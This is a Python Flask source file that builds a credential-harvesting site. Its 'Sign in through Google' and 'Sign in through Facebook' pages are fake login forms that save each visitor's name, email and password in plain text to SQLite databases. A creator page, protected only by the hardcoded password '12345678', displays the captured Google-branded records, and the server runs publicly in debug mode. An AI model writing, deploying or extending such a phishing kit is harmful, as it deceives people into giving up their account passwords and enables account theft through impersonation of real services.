import sqlite3
from flask import Flask, request, redirect 


conn = sqlite3.connect("users_login_info_google.db")
cursor = conn.cursor()

cursor.execute("""
CREATE TABLE IF NOT EXISTS users(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_name TEXT,
    user_email TEXT,
    user_pass TEXT
)
""")

conn.commit()
conn.close()

#_________________________________

conn = sqlite3.connect("users_login_info_facebook.db")
cursor = conn.cursor()

cursor.execute("""
CREATE TABLE IF NOT EXISTS users(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_name TEXT,
    user_email TEXT,
    user_pass TEXT
)
""")

conn.commit()
conn.close()


server = Flask(__name__)
                                                                                                                                                                                                            
@server.route("/", methods=["GET","POST"])
def interface():
    def msg_user():
        return f""" 
        hello this is official home page
        <br><br>
        <hr><hr>
        <a href="/about_pg">CLICK HERE TO ABOUT OUR WEBSITE </a>  
        <br><br>                                                                                                              
        <a href="/login_pg">CLICK HERE TO LOGIN </a>
        <br><br>
        <hr><hr>
        <a href="/creator_login">IT IS OFFICIAL PAGE FOR CREATOR </a>
        """ 
    return msg_user()
    
@server.route("/about_pg")
def about_pg():
        
        return f"""
        <h1>still under patching </h1>
        <hr><hr>
        """ 
@server.route("/login_pg")
def login_pg():
     
     return f"""
     
     <h1>LOGIN PAGE</h1>
     <hr><hr>
     <a href="/google_site">SIGN IN THROUGH GOOGLE </a>                                                                                
     <br>
      <h2>                                   Or                                              </h2>
     <a href="/fb_site">SIGN IN THROUGH FACEBOOK</a>
     
     """
@server.route("/google_site", methods=["GET","POST"])
def google_site():
     if request.method=="POST":
         
         user_name=request.form.get("user_name")
         user_email=request.form.get("user_email")
         user_pass=request.form.get("user_pass")
         print("post received ")
      
         conn=sqlite3.connect("users_login_info_google.db")
         cursor=conn.cursor()
         
         cursor.execute(" INSERT INTO users(user_name,user_email,user_pass) VALUES(?,?,?)",(user_name,user_email,user_pass))                     
         conn.commit()
         conn.close()
         return " saved sucessful "
     
     
     
     
     
     return f"""
        <form method="POST">
            <input type="text" name="user_name" placeholder="enter your name (eg alex)">
            <br><br>
            <input type="email" name="user_email" placeholder="enter your email  (eg @gmail)">                                                                        
            <br><br>
            <input type ="password" name="user_pass" placeholder ="enter your password (eg AaB1?#21)" >  
            <br><br>                  
            <input type="submit" value="confirm">
          </form>
        """
        
@server.route("/fb_site", methods=["GET","POST"])
def fb_site():
     if request.method=="POST":
         
         user_name=request.form.get("user_name")
         user_email=request.form.get("user_email")
         user_pass=request.form.get("user_pass")
         print("post received ")
      
         conn=sqlite3.connect("users_login_info_facebook.db")
         cursor=conn.cursor()
         
         cursor.execute(" INSERT INTO users(user_name,user_email,user_pass) VALUES(?,?,?)",(user_name,user_email,user_pass))                     
         conn.commit()
         conn.close()
         return " saved sucessful "
     
     
     
     
     
     return f"""
        <form method="POST">
            <input type="text" name="user_name" placeholder="enter your name (eg alex)">
            <br><br>
            <input type="email" name="user_email" placeholder="enter your email  (eg @gmail)">                                                                        
            <br><br>
            <input type ="password" name="user_pass" placeholder ="enter your password (eg AaB1?#21)" >  
            <br><br>                  
            <input type="submit" value="confirm">
          </form>
          
          
        """
        
@server.route("/creator_login")
def creator_login():
    return """
    <form action="/view_users" method="post">
        <input type="password" name="pwd">
        <input type="submit" value="Login">
    </form>
    """        
        
@server.route("/view_users", methods=["GET" ,"POST"] )
def view_users():
    offi_password="12345678"
    user_password = request.form.get("pwd")

    if user_password != offi_password:
        return redirect("/")
    
    
    conn = sqlite3.connect("users_login_info_google.db")
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM users")

    data = cursor.fetchall()

    conn.close()

    return str(data)     
        
if __name__ == "__main__":
    server.run(host="0.0.0.0", port=5000, debug=True)      

        
